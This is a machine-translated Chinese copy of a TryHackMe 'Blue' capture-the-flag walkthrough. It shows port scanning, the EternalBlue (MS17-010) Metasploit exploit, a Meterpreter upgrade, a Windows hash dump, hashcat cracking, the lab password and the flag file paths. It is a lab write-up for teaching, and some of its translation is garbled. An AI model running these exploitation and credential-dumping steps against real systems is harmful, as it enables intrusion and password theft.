<html>
<head>
<title>TryHackMe: Blue</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe:蓝色</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-blue-5166cedadead?source=collection_archive---------5-----------------------#2021-12-29">https://infosecwriteups.com/tryhackme-blue-5166cedadead?source=collection_archive---------5-----------------------#2021-12-29</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="8a7c" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">游戏攻略</h2></div><p id="910f" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">大家好，这边请。希望你在屏幕这边做得很好。所以，让我们开始开发我们的房间。</p><p id="ee6a" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">另外，我为这个博客做了一个小缩略图，让我知道它是怎样的:)</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi lb"><img src="../Images/e2367df0f26f21dff42c1935c14cf38d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*8wYMyveGhFgH6clwcz-Hbw.gif"/></div></div></figure></div><div class="ab cl ln lo hu lp" role="separator"><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls"/></div><div class="ij ik il im in"><h1 id="3789" class="lu lv iq bd lw lx ly lz ma mb mc md me jw mf jx mg jz mh ka mi kc mj kd mk ml bi translated">侦察:</h1><p id="e208" class="pw-post-body-paragraph kf kg iq kh b ki mm jr kk kl mn ju kn ko mo kq kr ks mp ku kv kw mq ky kz la ij bi translated">在首字母，我想出口IP，以节省时间XD。以后你可以用$IP来使用它</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi mr"><img src="../Images/f951b2c939410f193e90e24cb250cb30.png" data-original-src="https://miro.medium.com/v2/resize:fit:446/format:webp/1*4AA6Q2KlManPxN-npv9oaA.png"/></div></figure><p id="4c39" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">那么，让我们从rustscan开始，它是一个查找开放端口的更快的工具:</p><p id="e67a" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><code class="fe ms mt mu mv b">rustscan -a $IP | tee rustscan.txt</code></p><p id="df0c" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">| 'tee '用于保存文件</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi mw"><img src="../Images/9643765558a857b6fed216cee8d073b2.png" data-original-src="https://miro.medium.com/v2/resize:fit:680/format:webp/1*EOLjrceviNXL-yn7VHfG0Q.jpeg"/></div><figcaption class="mx my gj gh gi mz na bd b be z dk translated">Rustscan日志</figcaption></figure><p id="b733" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">现在我们有了开放端口，让我们从Nmap开始:</p><p id="dc48" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><code class="fe ms mt mu mv b">nmap -A -Pn -oN nmap.txt $IP</code></p><p id="9cb3" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">| <code class="fe ms mt mu mv b">-A </code>为所有，<code class="fe ms mt mu mv b">-Pn</code>为无视乒，<code class="fe ms mt mu mv b">-oN</code>为节约输出</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi nb"><img src="../Images/9498ef72101d0fbae5143e182e56ae00.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Uz4sOIWsAm3566bklVgJvA.png"/></div></div><figcaption class="mx my gj gh gi mz na bd b be z dk translated">Nmap日志</figcaption></figure><p id="4b0b" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">现在我们可以看到139端口正在使用<code class="fe ms mt mu mv b">Windows 7 Professional 7601 Service Pack 1 netbios-ssn</code>。经过一些搜索，它是脆弱的，这种利用是众所周知的</p><pre class="lc ld le lf gt nc mv nd ne aw nf bi"><span id="2acf" class="ng lv iq mv b gy nh ni l nj nk">‘EternalBlue’ SMB Remote Code Execution (MS17–010)</span></pre></div><div class="ab cl ln lo hu lp" role="separator"><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls"/></div><div class="ij ik il im in"><h1 id="065f" class="lu lv iq bd lw lx ly lz ma mb mc md me jw mf jx mg jz mh ka mi kc mj kd mk ml bi translated">获取外壳:</h1><p id="d767" class="pw-post-body-paragraph kf kg iq kh b ki mm jr kk kl mn ju kn ko mo kq kr ks mp ku kv kw mq ky kz la ij bi translated">现在我们知道如何利用，那么我们还在等什么:</p><p id="7d23" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我曾经用metasploit来利用这一点。</p><p id="8915" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><code class="fe ms mt mu mv b">msfconsole -q</code></p><p id="90be" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">| <code class="fe ms mt mu mv b">-q</code>用于访问直接接口</p><p id="1563" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">现在搜索漏洞</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi nl"><img src="../Images/232fd53eed16a9d4c983a66a90baa48b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2El50W_3tTXxz-9fZhtsoA.png"/></div></div><figcaption class="mx my gj gh gi mz na bd b be z dk translated">搜索漏洞</figcaption></figure><p id="2218" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">现在是时候使用exploit并为反向shell设置有效负载了。</p><p id="eb58" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><code class="fe ms mt mu mv b">use 0</code>或<code class="fe ms mt mu mv b">use exploit/windows/smb/ms17_010_eternalblue</code></p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi nm"><img src="../Images/4a4c5e5815f182a7f5711b336d597da7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*A3X9IiVB-6cBH4CL7hH3Ug.png"/></div></div></figure><p id="573f" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">设置有效载荷和<code class="fe ms mt mu mv b">run / exploit</code></p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi nn"><img src="../Images/df6d39be90bca0083f96d555e667a41d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nZ9-o4qF6W_6N_Wkc3fcMg.png"/></div></div></figure></div><div class="ab cl ln lo hu lp" role="separator"><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls"/></div><div class="ij ik il im in"><h1 id="7a44" class="lu lv iq bd lw lx ly lz ma mb mc md me jw mf jx mg jz mh ka mi kc mj kd mk ml bi translated">Shell升级:Meterpreter</h1><p id="f207" class="pw-post-body-paragraph kf kg iq kh b ki mm jr kk kl mn ju kn ko mo kq kr ks mp ku kv kw mq ky kz la ij bi translated"><code class="fe ms mt mu mv b">search shell_to_meterpreter</code>并使用它</p><p id="8c40" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><code class="fe ms mt mu mv b">set SESSION 1</code>和<code class="fe ms mt mu mv b">run</code></p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi nm"><img src="../Images/4a4c5e5815f182a7f5711b336d597da7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*A3X9IiVB-6cBH4CL7hH3Ug.png"/></div></div></figure></div><div class="ab cl ln lo hu lp" role="separator"><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls"/></div><div class="ij ik il im in"><h1 id="e7be" class="lu lv iq bd lw lx ly lz ma mb mc md me jw mf jx mg jz mh ka mi kc mj kd mk ml bi translated">开裂:</h1><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi no"><img src="../Images/23d383609b69c42c33ca71cf4133e8be.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gJD5wWcEJUTkxFX0mCvU7Q.png"/></div></div></figure><p id="2d78" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">让我们再开一次会</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi np"><img src="../Images/12d2b0233e5ce97ab78e4ed714a9ffc7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qPIN13amtDU2JRkltjMMBQ.png"/></div></div></figure><p id="ab1e" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我不知道为什么，但我的会议正在关闭，直到我得到第五届会议</p><p id="3b51" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">通过<code class="fe ms mt mu mv b">sessions -i &lt;session ID&gt;</code>进行评估</p></div><div class="ab cl ln lo hu lp" role="separator"><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls"/></div><div class="ij ik il im in"><h1 id="192d" class="lu lv iq bd lw lx ly lz ma mb mc md me jw mf jx mg jz mh ka mi kc mj kd mk ml bi translated">获取哈希转储:</h1><p id="7b4d" class="pw-post-body-paragraph kf kg iq kh b ki mm jr kk kl mn ju kn ko mo kq kr ks mp ku kv kw mq ky kz la ij bi translated">从现在开始，截图将会有另一种外观，因为使用了终端而不是终端。</p><p id="8e7e" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><code class="fe ms mt mu mv b">run post/windows/gather/hashdump</code></p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi nq"><img src="../Images/6f3ec94d088c5b9f75df7ac6d783b5a5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1380/format:webp/1*2lf6TnyKQVrpHEUssDMjvQ.png"/></div><figcaption class="mx my gj gh gi mz na bd b be z dk translated">Hashdump</figcaption></figure><p id="67ee" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">使用hashcat破解它</p><pre class="lc ld le lf gt nc mv nd ne aw nf bi"><span id="0a7a" class="ng lv iq mv b gy nh ni l nj nk">hashcat --username -a 0 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt</span></pre><p id="b68b" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">而我们得到了，乔恩的<strong class="kh ir">密码:</strong> <code class="fe ms mt mu mv b">alqfna22</code></p></div><div class="ab cl ln lo hu lp" role="separator"><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls"/></div><div class="ij ik il im in"><h1 id="bf87" class="lu lv iq bd lw lx ly lz ma mb mc md me jw mf jx mg jz mh ka mi kc mj kd mk ml bi translated">标志:</h1><p id="7bad" class="pw-post-body-paragraph kf kg iq kh b ki mm jr kk kl mn ju kn ko mo kq kr ks mp ku kv kw mq ky kz la ij bi translated">国旗时间到了，哟！！</p><p id="d04d" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">简单搜索一下🤷‍♂️，怎么会？让我们看看</p><p id="e952" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><code class="fe ms mt mu mv b">dir *.txt /s</code></p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi nr"><img src="../Images/76b6d70260b322bc0ee593666275991d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1216/format:webp/1*TrLU8N40l0Vrmql0uyVhfQ.png"/></div><figcaption class="mx my gj gh gi mz na bd b be z dk translated">标志搜索1</figcaption></figure><p id="5d79" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">但是没有显示2号旗。让我们深入吧</p><pre class="lc ld le lf gt nc mv nd ne aw nf bi"><span id="cfae" class="ng lv iq mv b gy nh ni l nj nk">dir flag* /s /p</span></pre><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi ns"><img src="../Images/73204c8464bada792a6b12d209c0537e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1230/format:webp/1*Q0NYzLX2Vuy3bE8nbSASqg.png"/></div><figcaption class="mx my gj gh gi mz na bd b be z dk translated">标志搜索2</figcaption></figure><pre class="lc ld le lf gt nc mv nd ne aw nf bi"><span id="51ef" class="ng lv iq mv b gy nh ni l nj nk">flag1.txt C:\flag1.txt<br/>flag2.txt C:\Windows\System32\config\flag2.txt<br/>flag3.txt C:\Users\Jon\Documents\flag3.txt</span></pre><p id="40de" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">现在我们已经成功地完成了TryHackMe的蓝色房间。</p><p id="3e86" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">如果你已经走了这么远，那么请务必花时间提供反馈。❤将不胜感激</p></div><div class="ab cl ln lo hu lp" role="separator"><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls"/></div><div class="ij ik il im in"><ul class=""><li id="2b83" class="nt nu iq kh b ki kj kl km ko nv ks nw kw nx la ny nz oa ob bi translated">|| <a class="ae oc" href="https://tryhackme.com/room/blue" rel="noopener ugc nofollow" target="_blank">房间</a> || <a class="ae oc" href="https://twitter.com/namx05" rel="noopener ugc nofollow" target="_blank">推特</a>| |<a class="ae oc" href="https://github.com/namx05" rel="noopener ugc nofollow" target="_blank">GitHub</a>| |<a class="ae oc" href="https://instagram.com/naman5.6" rel="noopener ugc nofollow" target="_blank">insta gram</a>| |</li></ul></div></div>    
</body>
</html>